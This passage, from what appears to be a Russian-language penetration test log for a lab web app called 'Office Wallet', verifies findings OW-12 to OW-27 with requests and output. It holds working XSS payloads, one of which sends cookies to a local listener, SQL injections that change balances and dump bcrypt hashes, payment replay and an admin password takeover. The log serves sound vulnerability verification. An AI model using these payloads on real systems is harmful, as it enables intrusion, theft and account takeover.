+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>История · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
+    ┌─ АРТЕФАКТ · OW-12 · HTML entities проходят фильтр и остаются в ответе
+    │ GET /history?q=<iframe src=entities> → HTTP 200
+    │ HTML payload в ответе: <iframe src="&#106;ava&#115;cript:alert(document.cookie)"></iframe>
+    └─
+[+] javascript: через сущности прошёл фильтр
+
+--- проверка 5/5 ---
+== 6. OW-12: сохранённый XSS в чаевых: живёт в базе и открывается потом ==
+    · Тот же фильтр стоит на комментарии чаевых (handlers_money.go:292), поэтому
+    · обход тот же. Чаевые отправляем себе — проверки на себя нет, деньги в итоге
+    · возвращаются на тот же счёт. Сохранённый payload открывается жертвой позже,
+    · по ссылке /tips/received?id=N, и там он выводится как template.HTML (строка 344):
+    → POST /tips/new  recipient=ivanov amount_rub=10 comment=<ScRiPt>...
+    ← HTTP 302 redirect=http://localhost:18081/history  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>История · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
+    → GET /tips/received  (ищем id своего чаевого)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Входящие чаевые · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapi...
+    → GET /tips/received?id=591  (карточка, Template.HTML без экранирования)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Чаевые #591 · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.co...
+    → SQL SELECT memo FROM operations WHERE id=591
+    ← psql <ScRiPt>new Image().src="http://127.0.0.1:9999/?"+document.cookie</ScRiPt>
+    ┌─ АРТЕФАКТ · OW-12 · сохранённый XSS лежит в БД и возвращается карточкой
+    │ operations.id=591 memo=<ScRiPt>new Image().src="http://127.0.0.1:9999/?"+document.cookie</ScRiPt>
+    │ GET /tips/received?id=591 → HTTP 200; payload не экранирован
+    └─
+[+] сохранённый payload лежит в карточке без экранирования: /tips/received?id=591
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-13
+################################################################################################
+== 6. OW-13: чужие операции через токены /api/ops/feed ==
+    · /api/ops/feed выдаёт подписи (op_grant) на 30 последних операций всех
+    · пользователей и рассовывает их в cookie (handlers_money.go:97-127). А проверка
+    · на /operations/N сверяет подпись только с uid того, кто смотрит (строки 78-89)
+    · — то есть feed сам раздаёт валидные ключи от чужих операций.
+    → SQL SELECT id FROM operations WHERE id >= (SELECT COALESCE(MAX(id)-29,0) FROM operations) AND COALESCE(from_user_id,0)<>1 AND COALESCE(to_user_id,0)<>1 ORDER BY id DESC LIMIT 1
+    ← psql 585
+    → SQL SELECT role FROM users WHERE login='ivanov'
+    ← psql admin
+    · у иванова роль admin (наши тесты переписали данные стенда) — админу и так
+    · всё можно, проверка подписей его не касается; снимем роль, чтобы показать
+    · проверку на себе. Важно: роль в куке перетирает роль из базы (auth.go:40-42),
+    · поэтому после правки перелогиниваемся, чтобы кука тоже стала employee:
+    → SQL UPDATE users SET role='employee' WHERE login='ivanov'
+    ← psql UPDATE 1
+    ← роль ivanov в базе: employee
+    → POST /login  login=ivanov (куки → Client)
+    ← HTTP 302 redirect=http://localhost:18081/  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    ← кука пересобрана: role=employee
+    чужая операция #585 (не ivanov), она в последних 30 — feed её выдаёт
+    → GET /operations/585  (без подписи — контроль)
+    ← HTTP 403 forbidden 
+    → GET /api/ops/feed  (подписи на 30 последних операций всех юзеров)
+    ← HTTP 200 [{"id":590,"kind":"purchase","status":"ok","t":"f192aae4418eb0916dce40068f14d2a2"},{"id":589,"kind":"topup","status":"ok","t":"d9b4d96496e2a851ffef89a8c513600e"},{"id":588,"kind":"purchase","status":"ok","t":"ea657437ffbb3b4df30cc331072e5de...
+    → GET /operations/585  (с кукой op_grant_585 из feed)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Операция · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">...
+    ┌─ АРТЕФАКТ · OW-13 · feed выдаёт grant на чужую операцию
+    │ чужая операция #585; без grant: HTTP 403
+    │ GET /api/ops/feed → HTTP 200; cookies содержит op_grant_585
+    │ с grant: HTTP 200, карточка открыта; memo=Отмена заказа #204
+    └─
+[+] 403 → 200: подписью из feed открыта чужая операция: Отмена заказа #204
+    → SQL UPDATE users SET role='admin' WHERE login='ivanov'
+    ← psql UPDATE 1
+    роль ivanov возвращена: admin
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-14
+################################################################################################
+--- проверка 1/2 ---
+== 2. OW-14: SQL-инъекция в сумме: запись в базу мимо всего кода ==
+    · Поле amount_rub не парсится как число — и сервер выполняет его как SQL-запрос
+    · (handlers_money.go:172-180). lib/pq при Exec без параметров гоняет все команды
+    · подряд, поэтому в форму перевода вставляется любая правка в базе: балансы,
+    · роли, пароли, статусы. Ни одна проверка приложения между нами и базой не стоит.
+    → SQL SELECT balance_kop FROM users WHERE login='ivanov';
+    ← psql 189441500
+    → POST /transfer/new  recipient=petrova amount_rub=1;UPDATE users SET balance_kop=balance_kop+500000 WHERE id=1;--
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Перевод · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
+    → SQL SELECT balance_kop FROM users WHERE login='ivanov';
+    ← psql 189941500
+    ┌─ АРТЕФАКТ · OW-14 · SQL-инъекция изменила баланс напрямую
+    │ users.login=ivanov  balance_kop: 189441500 → 189941500 (дельта +500000 коп)
+    │ Запрос приложения не проверял и не вычислял эту прибавку.
+    └─
+[+] баланс ivanov увеличен на 5000₽ через SQL-инъекцию
+    · А если подзапрос вернёт строку — приведение к bigint упадёт, и текст ошибки
+    · с содержимым печатается прямо в форме. На этом же месте читаются все хеши
+    · (см. stage_data.py, шаг 3).
+
+--- проверка 2/2 ---
+== 3. OW-14: дамп всех хешей паролей через SQL-инъекцию ==
+    · Тот же инъекционный пункт в сумме перевода (handlers_money.go:172-180), но
+    · для чтения: подзапрос возвращает строку, приведение к bigint падает, и текст
+    · ошибки с содержимым печатается прямо в форме. Шесть логинов с bcrypt-хешами
+    · выезжают без каких-либо прав — только рабочая учётка.
+    → POST /transfer/new  amount_rub=(SELECT string_agg(login||password_hash) FROM users)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Перевод · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
+    "kassa=$2a$10$Zssjo8K34d6BwzSaBwQ/IuwnAxvmun.Mcb8Qfa/Olpbru6qB2/R4S
+    buch=$2a$10$k2hQU0/WUG56ehd238qLE.vYvd8aynYmHmAGCEFNfj3cUgueODZYy
+    adminw=$2a$10$.WcgUxFiEZL4aYQrYr5bLun2/lMFs9Gifu4FENX2Z5AWs1dWOPy0u
+    sidorov=$2a$10$m.GFGJUh6MIMPjuXqqUG6OlDSVgLYED4vUea1VbEvQKSUnxsTtzTG
+    ivanov=$2a$10$DQdYa8ulSNI7ufNE7g.wIOwauAGuRjefvh4HpI6l5.yBULozjV9uy
+    petrova=$2a$10$3yRGTpVXg0YsQZZy7iVH4.CZu/fQwEjG2au0j9ZHnqc8oOZNL0xeS"
+    ┌─ АРТЕФАКТ · OW-14 · чтение данных через SQL error
+    │ POST /transfer/new с SELECT по users → HTTP 200
+    │ из ответа извлечены bcrypt-хеши (6): "kassa=$2a$10$Zssjo8K34d, buch=$2a$10$k2hQU0/WUG56, adminw=$2a$10$.WcgUxFiEZ, sidorov=$2a$10$m.GFGJUh6
+    └─
+[+] хеши получены (6 шт.)
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-15
+################################################################################################
+== OW-15 · параллельное подтверждение одного transfer draft ==
+    → SQL SELECT balance_kop FROM users WHERE login='ivanov';
+    ← psql 194188900
+    → SQL SELECT balance_kop FROM users WHERE login='petrova';
+    ← psql 922300
+    → POST /transfer/new amount=1 for OW-15
+    ← HTTP 302 redirect=http://localhost:18081/transfer/confirm?draft_id=37  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Подтверждение перевода · Office Wallet</title>   <link rel="preconnect" href="https://fonts.go...
+    → SQL SELECT amount_kop FROM transfer_drafts WHERE id=37
+    ← psql 100
+    → SQL UPDATE transfer_drafts SET amount_kop=GREATEST(amount_kop,50000) WHERE id=37
+    ← psql UPDATE 1
+    → SQL SELECT amount_kop FROM transfer_drafts WHERE id=37
+    ← psql 50000
+    → SQL SELECT count(*) FROM operations WHERE memo='OW-15 race'
+    ← psql 0
+    → SQL SELECT count(*) FROM operations WHERE memo='OW-15 race'
+    ← psql 12
+    → SQL SELECT balance_kop FROM users WHERE login='ivanov';
+    ← psql 193588900
+    → SQL SELECT balance_kop FROM users WHERE login='petrova';
+    ← psql 1522300
+    ┌─ АРТЕФАКТ · OW-15 · параллельные подтверждения draft
+    │ draft #37 amount_kop=50000; confirmations=12
+    │ operations с memo OW-15 race: 0 → 12
+    │ ivanov balance: 194188900 → 193588900; petrova: 922300 → 1522300
+    │ HTTP: 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200
+    └─
+[+] один draft был списан/зачислен более одного раза
+    → SQL DELETE FROM operations WHERE memo='OW-15 race'
+    ← psql DELETE 12
+    → SQL DELETE FROM transfer_drafts WHERE id=37
+    ← psql DELETE 0
+    → SQL UPDATE users SET balance_kop=194188900 WHERE login='ivanov'
+    ← psql UPDATE 1
+    → SQL UPDATE users SET balance_kop=922300 WHERE login='petrova'
+    ← psql UPDATE 1
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-16
+################################################################################################
+== OW-16 · конкурентные чаевые проходят одну и ту же проверку баланса ==
+    → SQL SELECT balance_kop FROM users WHERE login='ivanov';
+    ← psql 194188900
+    → SQL SELECT balance_kop FROM users WHERE login='petrova';
+    ← psql 922300
+    → SQL SELECT count(*) FROM operations WHERE memo='OW-16 race 1795717405'
+    ← psql 0
+    → SQL SELECT count(*) FROM operations WHERE memo='OW-16 race 1795717405'
+    ← psql 12
+    → SQL SELECT balance_kop FROM users WHERE login='ivanov';
+    ← psql -100
+    → SQL SELECT balance_kop FROM users WHERE login='petrova';
+    ← psql 195111300
+    ┌─ АРТЕФАКТ · OW-16 · гонка проверки баланса чаевых
+    │ balance before=194188900; amount per request=970945 RUB; parallel POST=12
+    │ tip operations: 0 → 12; expected amount_kop each=97094500
+    │ ivanov: 194188900 → -100; petrova: 922300 → 195111300
+    └─
+[+] несколько чаевых прошли по одному старому балансу
+    → SQL DELETE FROM operations WHERE memo='OW-16 race 1795717405'
+    ← psql DELETE 12
+    → SQL UPDATE users SET balance_kop=194188900 WHERE login='ivanov'
+    ← psql UPDATE 1
+    → SQL UPDATE users SET balance_kop=922300 WHERE login='petrova'
+    ← psql UPDATE 1
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-17
+################################################################################################
+== 3. OW-17: повтор платежа: подпись есть, а ограничений нет ==
+    · Подпись платежа — HMAC(константа PAYMENT_KEY, 'op:сумма:получатель'), ключ
+    · лежит в статике приложения (wallet.js). В подписи нет ни nonce, ни срока, ни
+    · привязки к сессии (handlers_money.go:368-401): проверяется только совпадение
+    · хеша. Значит одна и та же подпись проводит платёж сколько угодно раз, а поле
+    · to_login вообще меняет получателя мимо подписанного (строки 384-388).
+    → SQL SELECT id||' '||amount_kop||' '||to_user_id FROM operations WHERE to_user_id IS NOT NULL ORDER BY id LIMIT 1 OFFSET 1
+    ← psql 2 300 3
+    операция #2 из базы: сумма 300 коп, получатель 3
+    HMAC-SHA256(office-wallet-pay-key, '2:300:3') = 31ca118ef158d172ad6d...
+    → SQL SELECT balance_kop FROM users WHERE login='ivanov';
+    ← psql 189941500
+    → SQL SELECT login FROM users WHERE id=3
+    ← psql sidorov
+    → SQL SELECT balance_kop FROM users WHERE login='sidorov';
+    ← psql 61600
+    → SQL SELECT count(*) FROM operations WHERE kind='transfer' AND memo='повтор операции'
+    ← psql 73
+    → POST /pay/replay  op_id=2&amount_kop=300&recipient=3&sig=<подпись посчитана сама> (повтор 1)
+    ← HTTP 302 redirect=http://localhost:18081/history  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>История · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
+    → SQL SELECT balance_kop FROM users WHERE login='ivanov';
+    ← psql 189941200
+    → SQL SELECT balance_kop FROM users WHERE login='sidorov';
+    ← psql 61900
+    → POST /pay/replay  те же поля, та же подпись (повтор 2 — сервер не отличает)
+    ← HTTP 302 redirect=http://localhost:18081/history  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>История · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
+    → SQL SELECT balance_kop FROM users WHERE login='ivanov';
+    ← psql 189940900
+    → SQL SELECT balance_kop FROM users WHERE login='sidorov';
+    ← psql 62200
+    → SQL SELECT count(*) FROM operations WHERE kind='transfer' AND memo='повтор операции'
+    ← psql 75
+    ┌─ АРТЕФАКТ · OW-17 · одна подпись принята дважды
+    │ ivanov balance_kop: 189941500 → 189941200 → 189940900
+    │ sidorov balance_kop: 61600 → 61900 → 62200
+    │ operations с memo='повтор операции': 73 → 75
+    │ HTTP: 200 / 200
+    └─
+[+] две операции списаны и зачислены с одной подписью
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-18
+################################################################################################
+== OW-18 · проверка URL обходится внутренним redirect ==
+    → POST /settings/notify notify_url=http://notify-mock/hooks/verify
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Уведомления о платеже · Office Wallet</title>   <link rel="preconnect" href="https://fonts.goo...
+    → SQL SELECT count(*) FROM notify_settings WHERE user_id=(SELECT id FROM users WHERE login='ivanov') AND notify_url='http://notify-mock/hooks/verify'
+    ← psql 1
+    ┌─ АРТЕФАКТ · OW-18 · redirect пересёк URL allowlist
+    │ разрешённый URL: http://notify-mock/hooks/verify → mock отвечает 302 /service/status
+    │ GET после redirect вернул service=ok и ticket=wallet-ops-9c2e
+    │ POST /settings/notify → HTTP 200; сохранённая настройка count=1
+    └─
+[+] http.Client последовал редиректу за пределы проверенного /hooks/
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-19
+################################################################################################
+== 9. OW-19: отрицательное кассовое пополнение ==
+    · cashierTopup вызывает тот же parseRubToKop и проверяет только amount != 0
+    · (handlers_accounting.go:26-37) — знак не проверяется вовсе. Кассир (и админ,
+    · у admin роль считается кассиром) проводит пополнение на отрицательную сумму,
+    · и деньги списываются у жертвы как обычное «пополнение». Сначала поднимаем
+    · себе роль кассира — она пишется в базу, а кука её пока не знает:
+    → SQL SELECT role FROM users WHERE login='ivanov'
+    ← psql admin
+    → SQL UPDATE users SET role='cashier' WHERE login='ivanov' RETURNING role;
+    ← psql cashier
+    UPDATE 1
+    → POST /login  login=ivanov (куки → Client)
+    ← HTTP 302 redirect=http://localhost:18081/  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    → SQL SELECT balance_kop FROM users WHERE login='petrova'
+    ← psql 932300
+    → POST /cashier/topup  login=petrova amount_rub=-100 (минус 100₽)
+    ← HTTP 302 redirect=http://localhost:18081/  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    → SQL SELECT balance_kop FROM users WHERE login='petrova'
+    ← psql 922300
+    → SQL SELECT kind||' '||amount_kop||' '||memo FROM operations ORDER BY id DESC LIMIT 1;
+    ← psql topup -10000 Кассовое пополнение
+    ┌─ АРТЕФАКТ · OW-19 · отрицательное кассовое пополнение
+    │ petrova balance_kop: 932300 → 922300
+    │ последняя операция: kind|amount_kop|memo приведена в SQL-ответе выше
+    └─
+[+] баланс petrova 932300 -> 922300 коп: отрицательное «пополнение» проведено, в операциях строка topup с минусом
+    → SQL UPDATE users SET role='admin' WHERE login='ivanov' RETURNING role;
+    ← psql admin
+    UPDATE 1
+    → POST /login  login=ivanov (куки → Client)
+    ← HTTP 302 redirect=http://localhost:18081/  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    роль ivanov возвращена: admin
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-20
+################################################################################################
+== OW-20 · выдача заказа со статусом received повторно начисляет возврат ==
+    → SQL SELECT id FROM users WHERE login='petrova'
+    ← psql 2
+    → SQL INSERT INTO orders (user_id,status,total_kop,lines_json,item_comment) VALUES (2,'received',12345,'[]','OW-20 test') RETURNING id
+    ← psql 209
+    INSERT 0 1
+    → SQL SELECT balance_kop FROM users WHERE login='petrova';
+    ← psql 922300
+    → POST /cashier/fulfill/209 со статусом received
+    ← HTTP 302 redirect=http://localhost:18081/orders/209  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Заказ · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    → SQL SELECT balance_kop FROM users WHERE login='petrova';
+    ← psql 934645
+    → SQL SELECT id||' '||status FROM orders WHERE id=209;
+    ← psql 209 fulfilled_refund
+    → SQL SELECT count(*) FROM operations WHERE kind='refund' AND memo='Корректировка выдачи #209'
+    ← psql 1
+    ┌─ АРТЕФАКТ · OW-20 · повторное зачисление на выдаче
+    │ заказ #209 received → fulfilled_refund; POST вернул HTTP 200
+    │ petrova balance_kop: 922300 → 934645 (+12345)
+    │ операция refund создана: count=1
+    └─
+[+] cashierFulfill начислил деньги заказу, который уже received
+    → SQL DELETE FROM operations WHERE memo='Корректировка выдачи #209'
+    ← psql DELETE 1
+    → SQL DELETE FROM anomaly_log WHERE detail LIKE 'order=209 %'
+    ← psql DELETE 1
+    → SQL DELETE FROM orders WHERE id=209
+    ← psql DELETE 1
+    → SQL UPDATE users SET balance_kop=922300 WHERE login='petrova'
+    ← psql UPDATE 1
+    OW-20: тестовый заказ/операция удалены, баланс восстановлен
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-21
+################################################################################################
+== 5b. OW-21: SQL-инъекция в фильтре бухгалтерской сверки ==
+    · memo напрямую конкатенируется в LIKE. Добавляем OR true и SQL-комментарий;
+    · в ответе должны появиться операции даже при заведомо отсутствующем фильтре.
+    → POST /login  login=ivanov (куки → Client)
+    ← HTTP 302 redirect=http://localhost:18081/  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    → SQL SELECT role FROM users WHERE login='ivanov'
+    ← psql admin
+    → POST /accounting/reconcile memo=ow21_no_such_memo_7f91 (контроль без инъекции)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Сверка · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">  ...
+    → POST /accounting/reconcile memo=<OR true + SQL comment>
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Сверка · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">  ...
+    ┌─ АРТЕФАКТ · OW-21 · SQL injection развернула фильтр сверки
+    │ контроль memo=ow21_no_such_memo_7f91: строк в таблице=2
+    │ payload memo=%' OR '1'='1' --: строк в таблице=379
+    │ POST /accounting/reconcile → HTTP 200; ответ содержит операции
+    └─
+[+] SQL-предикат WHERE memo LIKE обойдён через введённый фильтр
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-22
+################################################################################################
+== OW-22 · ошибка UPDATE не откатывает запись корректировки ==
+    → SQL SELECT balance_kop FROM users WHERE login='petrova';
+    ← psql 922300
+    → SQL UPDATE users SET balance_kop=9223372036854775807 WHERE login='petrova' RETURNING balance_kop;
+    ← psql 9223372036854775807
+    UPDATE 1
+    → POST /accounting/adjust delta_rub=1 while balance is BIGINT max
+    ← HTTP 302 redirect=http://localhost:18081/  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    → SQL SELECT balance_kop FROM users WHERE login='petrova';
+    ← psql 9223372036854775807
+    → SQL SELECT id||'|'||amount_kop||'|'||memo FROM operations WHERE kind='adjust' AND memo='OW-22 split write' ORDER BY id DESC LIMIT 1
+    ← psql 593|100|OW-22 split write
+    ┌─ АРТЕФАКТ · OW-22 · частичный результат без транзакции
+    │ balance_kop перед: 9223372036854775807; UPDATE +100 коп упёрся в BIGINT max
+    │ balance_kop после: 9223372036854775807 (не изменился)
+    │ INSERT operations выполнен отдельно: 593|100|OW-22 split write; HTTP 200
+    └─
+[+] ошибка первого SQL не помешала второму INSERT создать ложный журнал
+    → SQL DELETE FROM operations WHERE kind='adjust' AND memo='OW-22 split write'
+    ← psql DELETE 1
+    → SQL UPDATE users SET balance_kop=922300 WHERE login='petrova'
+    ← psql UPDATE 1
+    OW-22: баланс восстановлен; тестовая операция удалена
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-23
+################################################################################################
+== 6. OW-23: перебор пароля без ограничений ==
+    · Ни капчи, ни счётчика попыток, ни задержки: шесть неверных паролей подряд —
+    · шесть одинаковых ответов, ни одной блокировки, аккаунт жив.
+    → попытка 1: login=ivanov password=nope   ← HTTP 200
+    → попытка 2: login=ivanov password=nope   ← HTTP 200
+    → попытка 3: login=ivanov password=nope   ← HTTP 200
+    → попытка 4: login=ivanov password=nope   ← HTTP 200
+    → попытка 5: login=ivanov password=nope   ← HTTP 200
+    → попытка 6: login=ivanov password=nope   ← HTTP 200
+    → POST /login  login=ivanov (куки → Client)
+    ← HTTP 302 redirect=http://localhost:18081/  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    ┌─ АРТЕФАКТ · OW-23 · шесть неудачных попыток без блокировки
+    │ неверные POST /login: 6; HTTP-коды: все 302 (см. строки выше)
+    │ контрольный вход правильным паролем прошёл → лимит/блокировка не сработали
+    └─
+[+] после шести ошибок вход по-прежнему работает, блокировки нет
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-24
+################################################################################################
+== 8. OW-24: ошибка хеширования при регистрации игнорируется ==
+    · hashPassword падает на пароле длиннее 72 байт (лимит bcrypt), ошибка
+    · вызывается молча (handlers_auth.go:80), и в базу пишется пустой хеш.
+    · Аккаунт создаётся, пароль не сохранён — войти в него нельзя никогда,
+    · и восстановить тоже нельзя: сброс тот же bcrypt. Аккаунт-зомби.
+    → POST /register  login=ow24_1795717396 password=<100 символов>
+    ← HTTP 302 redirect=http://localhost:18081/login  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Вход · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   <...
+    → SQL SELECT login||'|'||length(password_hash) FROM users WHERE login='ow24_1795717396';
+    ← psql ow24_1795717396|0
+    ← HTTP 200 на вход с исходным паролем
+    ┌─ АРТЕФАКТ · OW-24 · ошибка bcrypt проигнорирована
+    │ POST /register с password длиной 100 → HTTP 200
+    │ users.login|length(password_hash): ow24_1795717396|0
+    │ повторный POST /login → HTTP 200; пароль не позволяет войти
+    └─
+[+] в базе пустой хеш (length=0): пароль не записан, вход невозможен — регистрация с длинным паролем создаёт нерабочий аккаунт
+    → SQL DELETE FROM users WHERE login='ow24_1795717396';
+    ← psql DELETE 1
+    тестовый аккаунт ow24_1795717396 удалён из базы
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-25
+################################################################################################
+== OW-25 · fallback randomSMSCode требует fault injection crypto/rand ==
+    ┌─ АРТЕФАКТ · OW-25 · отказ crypto/rand воспроизводит предсказуемый код
+    │ временный Go test заменил rand.Reader на ошибающийся reader; файл PoC удалён после теста
+    │ ow25_poc_temp_test.go:18: forced rand.Reader failure => predictable fallback code 717131
+    │ runtime fault injection; код не отправлялся и не применялся
+    └─
+[+] randomSMSCode вернул time-based fallback после отказа rand.Reader
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-26
+################################################################################################
+--- проверка 1/2 ---
+== 3. OW-26/OW-27: полный захват пароля жертвы через сброс ==
+    · Сброс чужого пароля собирается из трёх кусков, и все три уже у нас:
+    ·  1) ссылка уходит на почту жертвы, но /mail отдаёт весь outbox любому вошедшему
+    ·     (handlers_auth.go:181-200) — забираем её оттуда;
+    ·  2) код подтверждения лежит в SMS-шлюзе, открытом кукой из шага 2;
+    ·  3) срок действия кода не проверяется и лимита попыток нет (handlers_auth.go:146).
+    → SQL SELECT password_hash FROM users WHERE login='adminw'
+    ← psql $2a$10$.WcgUxFiEZL4aYQrYr5bLun2/lMFs9Gifu4FENX2Z5AWs1dWOPy0u
+    → POST /password/forgot  login=adminw (письмо и SMS уходят в общие ящики)
+    ← HTTP 302 redirect=http://localhost:18081/password/forgot  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Сброс пароля · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.c...
+    → GET /mail  (весь outbox виден иванову)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Уведомления · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.co...
+    → GET /gateway/sms  (код по заявке #43)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>SMS-шлюз · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">...
+    ссылка: /password/reset?rid=43   код: 673407
+    → POST /password/reset  rid=43&sms_code=673407&password=Hack1234
+    ← HTTP 302 redirect=http://localhost:18081/login  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Вход · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   <...
+    → SQL SELECT password_hash FROM users WHERE login='adminw'
+    ← psql $2a$10$7RaARAmS4/VeSpErIzadquTgcFRSRRRpafp9dEjpKQ2dulhMCa5R2
+    → POST /login  login=adminw (куки → Client)
+    ← HTTP 302 redirect=http://localhost:18081/  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    ┌─ АРТЕФАКТ · OW-26/OW-27 · сброс сменил пароль жертвы
+    │ reset request rid=43 sms_code=<получен из gateway> → HTTP 200
+    │ password_hash изменён: $2a$10$.WcgUxFiEZL… → $2a$10$7RaARAmS4/V…
+    │ POST /login новым паролем → HTTP 302 (сессия выдана)
+    └─
+[+] пароль админа заменён, зашли: adminw / Hack1234
+    → SQL UPDATE users SET password_hash='$2a$10$.WcgUxFiEZL4aYQrYr5bLun2/lMFs9Gifu4FENX2Z5AWs1dWOPy0u' WHERE login='adminw'
+    ← psql UPDATE 1
+    → SQL SELECT password_hash FROM users WHERE login='adminw'
